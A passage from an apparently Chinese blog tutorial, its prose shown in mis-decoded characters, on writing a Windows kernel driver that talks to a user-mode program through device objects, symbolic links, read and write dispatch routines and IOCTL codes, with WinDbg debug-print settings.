<p>WinDbg: éœ€è¦è®¾ç½®ä¸€ä¸‹,<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/debug-universal-drivers---step-by-step-lab--echo-kernel-mode-">å›æ˜¾å†…æ ¸æ¨¡å¼è°ƒè¯• Windows é©±åŠ¨ - Windows drivers</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è°ƒè¯•å™¨ä¸­æ˜¾ç¤ºæ¥è‡ªç›®æ ‡ç³»ç»Ÿçš„æ‰€æœ‰è°ƒè¯•æ¶ˆæ¯</span></span><br><span class="line">ed nt!Kd_DEFAULT_MASK 0xFFFFFFFF</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰€æœ‰è°ƒè¯•ä¿¡æ¯æœ‰ç‚¹å¤šï¼Œæ‰“å°è°ƒè¯•å­—ç¬¦ä¸²</span></span><br><span class="line">ed nt!Kd_Default_Mask 8</span><br></pre></td></tr></table></figure>

<h3 id="R0-ä¸-R3-é€šä¿¡"><a href="#R0-ä¸-R3-é€šä¿¡" class="headerlink" title="R0 ä¸ R3 é€šä¿¡"></a>R0 ä¸ R3 é€šä¿¡</h3><p>é©±åŠ¨ç¨‹åºçš„ä¸»è¦åŠŸèƒ½ä¹Ÿå°±æ˜¯è´Ÿè´£å¤„ç†IOè¯·æ±‚ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†IOè¯·æ±‚æ˜¯åœ¨æ´¾é£å‡½æ•°ä¸­å¤„ç†çš„ã€‚</p>
<h4 id="R0"><a href="#R0" class="headerlink" title="R0"></a>R0</h4><p>åˆ›å»ºè®¾å¤‡å¯¹è±¡ï¼šä½¿ç”¨IoCreateDeviceå¿…é¡»ç®¡ç†å‘˜æ‰èƒ½æ‰“å¼€ è€Œä½¿ç”¨IoCreateDeviceSecure åˆ™å¯ä»¥æ™®é€šæƒé™æ‰“å¼€</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           PDRIVER_OBJECT  DriverObject,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceExtensionSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional] PUNICODE_STRING DeviceName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           DEVICE_TYPE     DeviceType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           ULONG           DeviceCharacteristics,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]           BOOLEAN         Exclusive,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out]          PDEVICE_OBJECT  *DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>è®¾å¤‡åï¼šç¬¦å·é“¾æ¥</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoCreateSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING DeviceName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// MS-DOS å‘½åè§„èŒƒ</span></span><br><span class="line">UNICODE_STRING DeviceName;</span><br><span class="line">UNICODE_STRING DosDeviceName;</span><br><span class="line">NTSTATUS status;</span><br><span class="line"></span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\DeviceName&quot;</span>);</span><br><span class="line"><span class="built_in">RtlInitUnicodeString</span>(&amp;DosDeviceName, <span class="string">L&quot;\\DosDevices\\DosDeviceName&quot;</span>);</span><br><span class="line">status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DosDeviceName, &amp;DeviceName);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status)) &#123;</span><br><span class="line">  <span class="comment">/* Symbolic link creation failed.  Handle error appropriately. */</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NTè§„èŒƒï¼šæ¯ä¸ªè®¾å¤‡æ¥å£ç±»éƒ½ä¸ GUID ç›¸å…³è”ã€‚KMDF ç»™çš„ä»£ç </span></span><br></pre></td></tr></table></figure>

<p>æ³¨å†Œå›è°ƒå‡½æ•° <code>MajorFunction[IDX](IDX ä»£è¡¨æ³¨å†Œè¯»å†™å‡½æ•°ï¼Œå®å‡½æ•°ï¼Œä¸è¦è¶…è¿‡æœ€å¤§å€¼</code> ï¼›IRP (I&#x2F;O Request Packet)ï¼›<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_driver_object">DRIVER_OBJECT (wdm.h) - Windows drivers </a>ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">_Use_decl_annotations_</span></span><br><span class="line"><span class="function">NTSTATUS</span></span><br><span class="line"><span class="function">  <span class="title">DispatchXxx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _DEVICE_OBJECT  *DeviceObject,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">struct</span> _IRP  *Irp</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="comment">// Function body</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤ç¬¦å·</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">IoDeleteSymbolicLink</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PUNICODE_STRING SymbolicLinkName</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>åˆ é™¤è®¾å¤‡</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">IoDeleteDevice</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PDEVICE_OBJECT DeviceObject</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>IOæ¡†æ¶</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_NAME <span class="string">L&quot;\\Device\\Demo&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LINK_NAME <span class="string">L&quot;\\DosDevices\\Demo&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">IOCTL æ§åˆ¶ç ï¼š</span></span><br><span class="line"><span class="comment">	I/O æ§åˆ¶ä»£ç æ˜¯ç”±å¤šä¸ªå­—æ®µç»„æˆçš„ 32 ä½å€¼ã€‚</span></span><br><span class="line"><span class="comment">	#define IOCTL_Device_Function CTL_CODE(DeviceType, Function, Method, Access)</span></span><br><span class="line"><span class="comment">		DeviceType: æ ‡è¯†è®¾å¤‡ç±»å‹ã€‚ æ­¤å€¼å¿…é¡»ä¸åœ¨é©±åŠ¨ç¨‹åºDEVICE_OBJECTç»“æ„çš„ DeviceType æˆå‘˜ä¸­è®¾ç½®çš„å€¼åŒ¹é…</span></span><br><span class="line"><span class="comment">		FunctionCodeï¼š æ ‡è¯†é©±åŠ¨ç¨‹åºè¦æ‰§è¡Œçš„å‡½æ•°ã€‚ å°äº 0x800 çš„å€¼æ˜¯ä¸º Microsoft ä¿ç•™çš„ã€‚ ä¾›åº”å•†å¯ä»¥ä½¿ç”¨ 0x800 å’Œæ›´é«˜å€¼</span></span><br><span class="line"><span class="comment">	#define CTL_CODE(DeviceType, Function, Method, Access) (</span></span><br><span class="line"><span class="comment">				(DeviceType) &lt;&lt; 16) | ((Access) &lt;&lt; 14) | ((Function) &lt;&lt; 2) | (Method)</span></span><br><span class="line"><span class="comment">			)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C VOID <span class="title">DriverUnload</span><span class="params">(PDRIVER_OBJECT pDriverObject)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Unload Driver\r\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿”å›å€¼å¹¶ä¸ä»£è¡¨æˆåŠŸï¼Œè€Œæ˜¯ pIrp-&gt;IoStatus.Status ä»£è¡¨IOæ˜¯å¦æˆåŠŸ</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchCommon</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS; <span class="comment">// IRPè®°å½•è¿™æ¬¡æ“ä½œæ˜¯å¦æˆåŠŸ</span></span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;         <span class="comment">// Informationç”¨æ¥è®°å½•å®é™…ä¼ è¾“çš„å­—èŠ‚æ•°çš„.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//æäº¤è¯·æ±‚.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;DispatchCommon\r\n&quot;</span>));</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;                  <span class="comment">// ä¸Šé¢çš„ STATUS_SUCCESSæ˜¯ç»™R3çœ‹çš„.ç°åœ¨çš„è¿”å›æ—¶ç»™IOç®¡ç†å™¨ç³»ç»Ÿçš„</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchRead</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pReadBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uReadLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pStack = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uMin = <span class="number">0</span>;</span><br><span class="line">	ULONG uHelloStr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	uHelloStr = (<span class="built_in">wcslen</span>(<span class="string">L&quot;Hello World&quot;</span>) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line">	pReadBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer; <span class="comment">//ç¼“å†²åŒº</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//è·å–IRPå †æ ˆ.æˆ‘ä»¬è¯´è¿‡3ç¯è°ƒç”¨0ç¯.éœ€è¦å°è£…åœ¨IRPç»“æ„ä¸­.windowsæ˜¯åˆ†å±‚é©±åŠ¨.æ‰€ä»¥IRPå¤´éƒ¨æ˜¯å…±ç”¨çš„.å…¶ä½™çš„æ˜¯æ ˆä¼ é€’.</span></span><br><span class="line">	pStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line">	uReadLength = pStack-&gt;Parameters.Read.Length;</span><br><span class="line">	uMin = uReadLength &gt; uHelloStr ? uHelloStr : uReadLength;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pReadBuffer, <span class="string">L&quot;Hello World&quot;</span>, uMin); <span class="comment">//æ‹·è´åˆ°ç¼“å†²åŒºä¸­ç»™3ç¯.</span></span><br><span class="line"></span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uMin;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æäº¤è¯·æ±‚.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchWrite</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	PVOID pWriteBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uWriteLength = <span class="number">0</span>;</span><br><span class="line">	PIO_STACK_LOCATION pIrpStack = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="comment">//è·å–IRPå †æ ˆ</span></span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//è·å–å†™çš„é•¿åº¦.</span></span><br><span class="line">	uWriteLength = pIrpStack-&gt;Parameters.Write.Length;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	pWriteBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	<span class="comment">//ç”³è¯·å†…å­˜.</span></span><br><span class="line">	pBuffer = <span class="built_in">ExAllocatePoolWithTag</span>(PagedPool, uWriteLength, <span class="string">&#x27;DEMO&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == pBuffer)</span><br><span class="line">	&#123;</span><br><span class="line">		pIrp-&gt;IoStatus.Status = STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">		pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line">		<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">		<span class="keyword">return</span> STATUS_INSUFFICIENT_RESOURCES;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//æäº¤è¯·æ±‚.</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">RtlZeroMemory</span>(pBuffer, uWriteLength);</span><br><span class="line">	<span class="comment">//æ‹·è´åˆ°0ç¯ç¼“å†²åŒº</span></span><br><span class="line">	<span class="built_in">RtlCopyMemory</span>(pBuffer, pWriteBuffer, uWriteLength);</span><br><span class="line">	<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Write %s\r\n&quot;</span>, (PCHAR)pBuffer));</span><br><span class="line">	<span class="built_in">ExFreePool</span>(pBuffer);</span><br><span class="line">	pBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = uWriteLength;</span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">NTSTATUS <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, PIRP pIrp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">//å†…æ ¸ä¸­å…±äº« SystemBuffer æœ‰æ—¶é—´å·®.å…ˆè¯»åœ¨å†™.</span></span><br><span class="line">	PIO_STACK_LOCATION pIrpStack;</span><br><span class="line">	PVOID InPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PVOID OutPutBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	ULONG uInPutLength = <span class="number">0</span>;</span><br><span class="line">	ULONG uOutPutBufferLength = <span class="number">0</span>;</span><br><span class="line">	ULONG IoCtrl = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	InPutBuffer = OutPutBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">	pIrpStack = <span class="built_in">IoGetCurrentIrpStackLocation</span>(pIrp);</span><br><span class="line"></span><br><span class="line">	IoCtrl = pIrpStack-&gt;Parameters.DeviceIoControl.IoControlCode;  <span class="comment">//è·å–æ§åˆ¶ç .</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">switch</span>(IoCtrl)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> CTL_HELLO:</span><br><span class="line">			<span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;IOCTL HelloWorld\r\n&quot;</span>));</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	pIrp-&gt;IoStatus.Status = STATUS_SUCCESS;</span><br><span class="line">	pIrp-&gt;IoStatus.Information = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//æäº¤è¯·æ±‚.</span></span><br><span class="line">	<span class="built_in">IoCompleteRequest</span>(pIrp, IO_NO_INCREMENT);</span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">EXTERN_C NTSTATUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRigisterEntry)</span> </span>&#123;</span><br><span class="line">	UNICODE_STRING uDevName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	UNICODE_STRING uLinkName = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	NTSTATUS status;</span><br><span class="line">	PDEVICE_OBJECT pDevObj;</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uDevName, DRIVER_NAME);</span><br><span class="line">	<span class="built_in">RtlInitUnicodeString</span>(&amp;uLinkName, LINK_NAME);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;Init Driver\r\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	pDriverObject-&gt;DriverUnload = DriverUnload;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// åˆ›å»ºè®¾å¤‡</span></span><br><span class="line">	status = <span class="built_in">IoCreateDevice</span>(pDriverObject, <span class="number">0</span>, &amp;uDevName, FILE_DEVICE_UNKNOWN, <span class="number">0</span>, FALSE, &amp;pDevObj);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateDevice\r\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ä¸æ˜¯è¿™ä¸ª=&gt;è“å±</span></span><br><span class="line">	pDevObj-&gt;Flags |= DO_BUFFERED_IO;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// åˆ›å»ºç¬¦å·é“¾æ¥</span></span><br><span class="line">	status = <span class="built_in">IoCreateSymbolicLink</span>(&amp;uLinkName, &amp;uDevName);</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(status))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;[-] Error IoCreateSymbolicLink\r\n&quot;</span>);</span><br><span class="line">		<span class="built_in">IoDeleteDevice</span>(pDevObj);</span><br><span class="line">		<span class="keyword">return</span> status;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// IO </span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; IRP_MJ_MAXIMUM_FUNCTION; i++) </span><br><span class="line">	&#123;</span><br><span class="line">		pDriverObject-&gt;MajorFunction[i] = DispatchCommon;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Read Write IOCTL</span></span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_READ] = DispatchRead;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_WRITE] = DispatchWrite;</span><br><span class="line">	pDriverObject-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">DbgPrintEx</span>(DPFLTR_IHVDRIVER_ID, DPFLTR_INFO_LEVEL, <span class="string">&quot;[+] Create Driver Success\r\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="R3"><a href="#R3" class="headerlink" title="R3"></a>R3</h4><p>åœ¨ç”¨æˆ·æ¨¡å¼ä¸‹æ‰“å¼€ <code>\\DosDevices\\DosDeviceName</code>Â è®¾å¤‡ï¼Œè¯·åœ¨æ‰“å¼€æ–‡ä»¶åæ—¶æŒ‡å®šÂ <code>\\.\</code>ï¼Œéœ€è¦è½¬ä¹‰ç¬¦</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">file = <span class="built_in">CreateFileW</span>(<span class="string">L&quot;\\\\.\\DosDeviceName&quot;</span>,</span><br><span class="line">	GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>,</span><br><span class="line">    OPEN_EXISTING,</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>


<p>é€šè¿‡<code>ReadFile</code>å’Œ <code>WriteFile</code> ç³»ç»Ÿè°ƒç”¨è¿›è¡Œè¯»å†™ï¼Œioctlä½¿ç”¨</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">DeviceIoControl</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                HANDLE       hDevice,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        dwIoControlCode,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, optional]      LPVOID       lpInBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nInBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPVOID       lpOutBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]                DWORD        nOutBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional]     LPDWORD      lpBytesReturned,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out, optional] LPOVERLAPPED lpOverlapped</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>äº¤äº’</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTRL_BASE 0x800</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYIOCTRL_CODE(i)	\</span></span><br><span class="line"><span class="meta">	CTL_CODE(FILE_DEVICE_UNKNOWN, IOCTRL_BASE + i, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CTL_HELLO MYIOCTRL_CODE( 0 )</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hFile = <span class="built_in">CreateFileW</span>(<span class="built_in">TEXT</span>(<span class="string">&quot;\\\\.\\Demo&quot;</span>),</span><br><span class="line">		GENERIC_WRITE | GENERIC_READ,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;CreateFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	TCHAR szBuff[<span class="number">0X100</span>];</span><br><span class="line">	DWORD dwBytes = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">ReadFile</span>(hFile, szBuff, <span class="built_in">sizeof</span>(szBuff) / <span class="built_in">sizeof</span>(szBuff[<span class="number">0</span>]), &amp;dwBytes, <span class="literal">NULL</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;ReadFile ErrorCode:%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;bytes:%d data:%ls\n&quot;</span>, dwBytes, szBuff);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hFile,</span><br><span class="line">		CTL_HELLO,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, </span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hFile);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="more"><a href="#more" class="headerlink" title="more"></a>more</h4><p>å…³äº DEBUG é—®é¢˜ï¼Œå¸¸è§ <code>DbgPrint</code>, <code>DbgPrintEx</code>ã€‚<code>KdPrintEx</code>è¿™ç§æ˜¯å®è¡¨ç¤ºã€‚Ex å‡½æ•°ä¸ºäº†æ›´å¥½çš„æ‰“å°å‡ºè°ƒè¯•ä¿¡æ¯ï¼ˆæ¶ˆæ¯è¿‡æ»¤æœºåˆ¶ï¼š<a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debugger/reading-and-filtering-debugging-messages">è¯»å–å’Œç­›é€‰è°ƒè¯•æ¶ˆæ¯ - Windows drivers</a></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KdPrintEx(_x_) DbgPrintEx _x_ </span></span><br><span class="line"><span class="function">NTSYSAPI ULONG <span class="title">DbgPrintEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG ComponentId,      <span class="comment">// é¿å…å°†é©±åŠ¨ç¨‹åºçš„è¾“å‡ºä¸ Windows ç»„ä»¶çš„è¾“å‡ºæ··åˆ</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG Level,            <span class="comment">// æŒ‡å®šè¦å‘é€çš„æ¶ˆæ¯çš„ä¸¥é‡æ€§</span></span></span></span><br><span class="line"><span class="params"><span class="function">  [in] PCSTR Format,</span></span></span><br><span class="line"><span class="params"><span class="function">       ...   </span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br><span class="line"><span class="comment">// DPF: Debug Print Filter</span></span><br><span class="line"><span class="comment">// IHV: Independent Hardware Vendor</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">KdPrintEx</span>((DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, <span class="string">&quot;DPFLTR_ERROR_LEVEL\n&quot;</span>));  <span class="comment">// éœ€è¦åŒæ‹¬å·</span></span><br><span class="line"><span 